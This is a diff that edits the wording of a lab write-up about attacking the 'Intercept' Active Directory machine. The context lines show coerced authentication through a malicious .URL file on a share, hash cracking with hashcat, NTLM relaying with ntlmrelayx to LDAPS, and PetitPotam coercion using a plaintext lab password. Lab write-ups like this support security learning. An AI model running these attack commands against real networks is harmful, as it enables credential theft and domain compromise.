@@ -26,7 +26,7 @@ Using this null session I entered the "dev" share and looked through the directo
 
 ![_install](/assets/img/VL-Intercept/null_session_dev_2.png)
 
-Something that stood out to me is that there is a readme.txt file which says that the share is checked regulary for updates. This for me immediately triggered "coerced authentication". We can craft a malicious .URL file that triggers an authentication request to our SMB listener when someone accesses the share. We can then attempt to relay or crack the authentication request. Is used to following URL payload:
+Something that stood out to me is that there is a "readme.txt" file which says that the share is checked regulary for updates. This for me immediately triggered "coerced authentication". We can craft a malicious .URL file that triggers an authentication request to our SMB listener when someone accesses the share. We can then attempt to relay or crack the authentication request. I crafted the following .URL payload:
 
 ```bash
 [InternetShortcut]
@@ -47,7 +47,7 @@ Sadly I can't relay the connection to the Domain Controller because SMB Signing 
 
 ![_install](/assets/img/VL-Intercept/signing_enabled.png)
 
-Despite SMB Signing being enabled by default on the Domain Controller, which prevents direct connection relaying, I decided to attempt  cracking the hash with hashcat:
+Despite SMB Signing being enabled by default on the Domain Controller, which prevents direct connection relaying, I decided to attempt cracking the hash with hashcat:
 
 ```bash
 hashcat -a 0 -m 5600 hash.txt /opt/rockyou.txt
@@ -88,7 +88,7 @@ Next is starting ntlmrelayx for relaying the coerced authentication:
 ntlmrelayx.py -t ldaps://10.10.185.69 --delegate-access --http-port 8080 -smb2support
 ```
 ![_install](/assets/img/VL-Intercept/ntlmrelayx.png)
-Finishing off we coerce authenticated using PetitPotam to our created DNS record which is in trusted intranet zone which gets relayed to the Domain Controller to allow impersonation on WS01$ via S4U2Proxy. We can trigger the coercion using:
+Finishing off we coerce authenticated using PetitPotam to our created DNS record which is in trusted intranet zone which gets relayed to the Domain Controller to allow impersonation on WS01$ via S4U2Proxy. We can trigger the coercion using PetitPotam like so:
 ```bash
 petitpotam.py -d "intercept.vl" -u "kathryn.spencer" -p "Chocolate1" kali@8080/a 10.10.185.70
 ```
